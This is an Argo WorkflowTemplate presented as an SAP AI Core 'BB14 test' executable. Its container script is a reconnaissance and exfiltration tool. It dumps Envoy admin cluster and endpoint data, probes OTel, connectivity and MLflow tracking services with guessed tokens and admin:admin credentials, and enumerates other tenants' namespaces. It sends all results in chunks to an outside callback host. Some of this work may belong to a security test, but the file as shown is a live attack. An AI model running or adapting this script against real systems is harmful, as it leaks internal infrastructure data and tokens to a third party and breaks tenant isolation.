apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "5.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "$CB?src=$1" --max-time 5 -d @- ; }
        get() { curl -k -s "$CB?src=$1" --max-time 5 ; }

        get "recon5-start-$(hostname)"

        # === 1. FULL cluster names dump (unique service names only) ===
        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | \
          grep -oE 'outbound\|[0-9]+\|[^|]*\|[^ ;:]+' | sort -u > /tmp/cnames.txt
        wc -l /tmp/cnames.txt | post "recon5-cnames-count"
        # Send in 700-byte chunks
        split -b 700 /tmp/cnames.txt /tmp/cn_
        i=0; for f in /tmp/cn_*; do cat "$f" | post "recon5-cnames-${i}"; i=$((i+1)); done

        # === 2. Extract unique namespace names from cluster data ===
        cat /tmp/cnames.txt | grep -oE '[a-z0-9-]+\.svc\.cluster\.local' | \
          sed 's/\.svc\.cluster\.local//' | sort -u | post "recon5-namespaces"

        # === 3. OTel collector - deep exploration ===
        OTEL="http://100.109.206.82:13133"
        curl -k -s --connect-timeout 3 "${OTEL}/debug/pipelinez" 2>&1 | head -c 700 | post "recon5-otel-pipes"
        curl -k -s --connect-timeout 3 "${OTEL}/debug/extensionz" 2>&1 | head -c 700 | post "recon5-otel-ext"
        curl -k -s --connect-timeout 3 "${OTEL}/debug/servicez" 2>&1 | head -c 700 | post "recon5-otel-svc"

        # === 4. SAP Connectivity Service - try various tokens/headers ===
        CONN="http://100.104.7.43:20003"
        # Try with our JWT as connectivity token
        curl -k -s --connect-timeout 3 "${CONN}/" \
          -H "SAP-CP-Connectivity-Service-Token: ${AICORE_TRACKING_TOKEN:-test}" 2>&1 | head -c 700 | post "recon5-conn-test"
        # Try empty token
        curl -k -s --connect-timeout 3 "${CONN}/" \
          -H "SAP-CP-Connectivity-Service-Token: " 2>&1 | head -c 700 | post "recon5-conn-empty"
        # Try common paths
        curl -k -s --connect-timeout 3 "${CONN}/api/v1/connectivity" 2>&1 | head -c 700 | post "recon5-conn-api"
        curl -k -s --connect-timeout 3 "${CONN}/healthz" 2>&1 | head -c 700 | post "recon5-conn-health"

        # === 5. 8888 services - path enumeration ===
        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
          for path in /healthz /health /api /v1 /v2 /metrics /debug /status /info /swagger /api/v1 /config /.well-known/openid-configuration; do
            result=$(curl -k -s --connect-timeout 2 "http://${ip}:8888${path}" 2>&1)
            if [ -n "$result" ] && ! echo "$result" | grep -q "404 page not found"; then
              echo "${ip}:8888${path} => ${result}" | head -c 500 | post "recon5-8888-${ip}-$(echo $path | tr '/' '_')"
            fi
          done
        done

        # === 6. Tracking service auth discovery ===
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        # Try different header names
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "X-Token: test" 2>&1 | head -c 700 | post "recon5-track-xtoken"
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "AI-Auth-Token: test" 2>&1 | head -c 700 | post "recon5-track-aiauth"
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
          -H "X-AI-Token: test" 2>&1 | head -c 700 | post "recon5-track-xai"
        # Check if basic auth works
        curl -k -s --connect-timeout 3 -u "admin:admin" "${TRACK}/api/2.0/mlflow/experiments/list" 2>&1 | head -c 700 | post "recon5-track-basic"
        # Check if no-auth paths exist
        curl -k -s --connect-timeout 3 "${TRACK}/health" 2>&1 | head -c 700 | post "recon5-track-health2"
        curl -k -s --connect-timeout 3 "${TRACK}/" 2>&1 | head -c 700 | post "recon5-track-root2"
        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/" 2>&1 | head -c 700 | post "recon5-track-api-root"

        # === 7. Try Envoy admin to modify routing (CRITICAL) ===
        # POST to /clusters to get stats with actual endpoint IPs
        curl -k -s "http://127.0.0.1:15000/clusters?format=json" 2>&1 | \
          python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    for cs in d.get('cluster_statuses',[])[:50]:
        name=cs.get('name','')
        hosts=cs.get('host_statuses',[])
        for h in hosts:
            addr=h.get('address',{}).get('socket_address',{})
            ip=addr.get('address','')
            port=addr.get('port_value','')
            if ip: print(f'{name} -> {ip}:{port}')
except: pass
" 2>&1 | head -c 2000 | post "recon5-cluster-endpoints-1"

        curl -k -s "http://127.0.0.1:15000/clusters?format=json" 2>&1 | \
          python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    for cs in d.get('cluster_statuses',[])[50:100]:
        name=cs.get('name','')
        hosts=cs.get('host_statuses',[])
        for h in hosts:
            addr=h.get('address',{}).get('socket_address',{})
            ip=addr.get('address','')
            port=addr.get('port_value','')
            if ip: print(f'{name} -> {ip}:{port}')
except: pass
" 2>&1 | head -c 2000 | post "recon5-cluster-endpoints-2"

        # === 8. Try to access other resource group namespaces directly ===
        # Our namespace is rg-3ba0e0a4-cd927cab
        # Try common patterns for other BB tenants
        for ns in rg-3ba0e0a4 rg-default default ml-tracking ml-serving ai-core; do
          nslookup -timeout=2 "${ns}.svc.cluster.local" 2>&1 | head -c 200 | post "recon5-ns-${ns}"
        done

        # Try to resolve specific services in other BB tenant namespaces
        # BB-13 and BB-15 are other tenants we know about
        for prefix in rg-3ba0e0a3 rg-3ba0e0a5 rg-3ba0e0a2 rg-3ba0e0a1; do
          for suf in $(echo abcdef0123456789 | fold -w1); do
            result=$(nslookup -timeout=1 "anything.${prefix}-${suf}.svc.cluster.local" 2>&1)
            if ! echo "$result" | grep -q "NXDOMAIN\|SERVFAIL\|timed out"; then
              echo "${prefix}-${suf}: ${result}" | post "recon5-tenant-${prefix}-${suf}"
            fi
          done
        done

        get "recon5-done-$(hostname)"
      resources:
        limits:
          cpu: "1"
          memory: "1Gi"
        requests:
          cpu: "100m"
          memory: "256Mi"
